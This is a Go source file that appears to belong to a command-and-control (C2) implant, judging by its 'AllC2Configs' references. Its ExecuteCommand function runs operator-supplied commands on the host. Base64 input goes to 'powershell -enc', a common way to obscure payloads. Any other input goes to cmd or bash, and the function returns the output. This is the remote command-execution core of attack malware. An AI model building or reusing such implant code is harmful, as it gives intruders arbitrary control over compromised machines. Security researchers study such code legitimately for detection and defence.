package common

import (
	"encoding/base64"
	"os/exec"
	"runtime"
	"strings"
)

func ExecuteCommand(commandToExecute string) (string, error) {

	//remove any whitespace from the command
	commandToExecute = strings.TrimSpace(commandToExecute)

	if isBase64(commandToExecute) {
		commandOutput, err := runPowershellCommand(commandToExecute)
		AllC2Configs.Debug.LogDebug(commandOutput + "Base64")
		return commandOutput, err
	} else {
		commandOutput, err := runCmdOrBashCommand(commandToExecute)
		AllC2Configs.Debug.LogDebug(commandOutput + "Not Base64")
		return commandOutput, err
	}
}

func isBase64(s string) bool {
	_, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return false
	} else {
		return true
	}
}

func runPowershellCommand(command string) (string, error) {
	switch runtime.GOOS {
	case "windows":
		outCommand, err := exec.Command("powershell", "-enc", command).Output()
		return string(outCommand), err
	case "unknown":
		panic("Unsupported OS")
	default:
		outCommand, err := exec.Command("powershell", "-enc", command).Output()
		AllC2Configs.Debug.LogDebug(string(outCommand))
		return string(outCommand), err

	}

}

func runCmdOrBashCommand(command string) (string, error) {
	switch runtime.GOOS {
	case "windows":
		outCommand, err := exec.Command("cmd", "/C", command).Output()
		AllC2Configs.Debug.LogDebug(string(outCommand))
		return string(outCommand), err
	case "unknown":
		panic("Unsupported OS")
	default:
		outCommand, err := exec.Command("bash", "-c", command).Output()
		AllC2Configs.Debug.LogDebug(string(outCommand))
		return string(outCommand), err

	}
}
